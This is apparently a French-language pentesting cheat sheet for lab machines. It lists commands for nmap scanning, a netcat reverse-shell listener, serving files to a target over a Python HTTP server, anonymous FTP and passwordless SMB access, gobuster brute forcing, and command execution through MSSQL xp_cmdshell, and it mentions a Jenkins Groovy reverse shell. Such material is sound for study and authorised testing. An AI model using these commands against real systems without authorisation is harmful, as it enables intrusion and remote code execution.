
### Objectif
Afin de simplifier et de résumer les différentes phases de pentesting, j'écris dans cet article les commandes les plus utilisées.
L'objectif pricipal est d'expliquer brièment la fonction de chaque commande, pour permettre leur utilisation récursive.

### Nmap

```shell
nmap -sV -sC {IP-dest}
```
Dans ce lien, vous pouvez télécharger un bon PDF: [Nmap cheatsheet](https://stationx-public-download.s3.us-west-2.amazonaws.com/nmap_cheet_sheet_v7.pdf)

### Commandes utiles

Écrire à la fin d'un document
```shell
echo "{dest-IP} ignition.htb" | sudo tee -a /etc/hosts
```
Créer un listener sur le port spécifié avec NETCAT pour recevoir des conexion externes.
```shell
nc -lvnp 8000
 
 #-l   : Mode écoute
 #-v   : Mode verboux. Montre plus de détails dans les messages
 #-n   : Adresses IP numériques uniquement, pas de résolution DNS
 #-p   : Port d'écoute
```
Créer un serveur http avec python et partage de fichiers 
```
 # à partir du dossier où l'on veut partager les fichiers
python3 -m http.server 80

 #pour accéder aux ficiers
wget http://host-IP/fichier -outfile fichier
```

### 21 TCP FTP

```shell
ftp {target_IP} #Puis login avec anonymous

 #help  :Liste de commandes
 #get   :Telecharger des fichiers
 #bye   :sortir
```
#### Jenkins
Après avoir appris que vous pouvez exécuter des scropts Groovy dans Jenkins, vous accédez à l'un des sites Web énumérés ci-dessus et exécutez un reverse shell.

### 23 TCP Telnet

```shell
telnet {IP-dest}
```
### 80 TCP HTTP

Gobuster est un outil pour forcer avec bruteforce les répertoires, fichiers et sous-domaines DNS

```shell
gobuster dir -u http://10.129.33.133:80 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.129.1.15 dir -w /usr/share/wordlists/dirb/common.txt -x php,html

 # -x  :l'extension spécifiée est ajoutée à tous les mots contenus dans le dictionnaire -w. 
 # Pour connaître le bon format, vous pouvez utiliser le plugin Wappalyzer et voir quelles technologies sont utilisées
 # -u  :pour le répertoire
 # -w  :pour le dictionnaire
 #Pour télécharger les listes les plus utilisées, <apt -y install seclists> et peut être trouvé dans /usr/share/seclists/
```
Pour obtenir plus d'informations sur une demande, vous pouvez utiliser cURL

```shell
curl -v http://{dest-IP}/
```

### 445 TCP SMB

```shell
smbclient -L \\\\{dest-IP}
 # smbclient -L \\\\{dest-IP} -U 'administrator' #sans mot de passe   
smbclient \\\\{dest-IP}\\{éléments partagés} #Appuyez sur entrée sans mot de passe
 # smbclient \\\\{dest-IP}\\{éléments partagés} -U 'administrator'
 
 # -L   : Afficher les fichiers partagés
 # -U   : Nom d'utilisateur
 # get  : Lorsque vous accédez à smb, pour télécharger des fichiers
```

### 1433 TCP MSSQL
Utilisarion de Inpacket

```
python3 mssqlclient.py ARCHETYPE/sql_svc@{dest-IP} -windows-auth
```
Une fois à l'intérieur, xp_cmdshell est utilisé pour exécuter les commandes

```
SQL> xp_cmdshell "powershell -c whoami" # Exemple
```


### 3306 TCP Mysql

```shell
mysql -h {ip-dest} -u {user}

 # mysql --help
 # SHOW databases;              : Imprime les bases de données auxquelles nous pouvons accéder.
 # USE {database_name};         : Défini pour utiliser la base de données nommée {base de données}
 # SHOW tables;                 : Imprime les tables disponible dans la base de données actuelle.
 # SELECT * FROM {table_name};  : Imprime toutes les données de la table {table}
```
[SQL Cheatsheet](https://www.mysqltutorial.org/mysql-cheat-sheet.aspx)

### 3389 TCP RDP 

```shell
xfreerdp /v:{dest-IP} /cert:ignore /u:Administrator
```
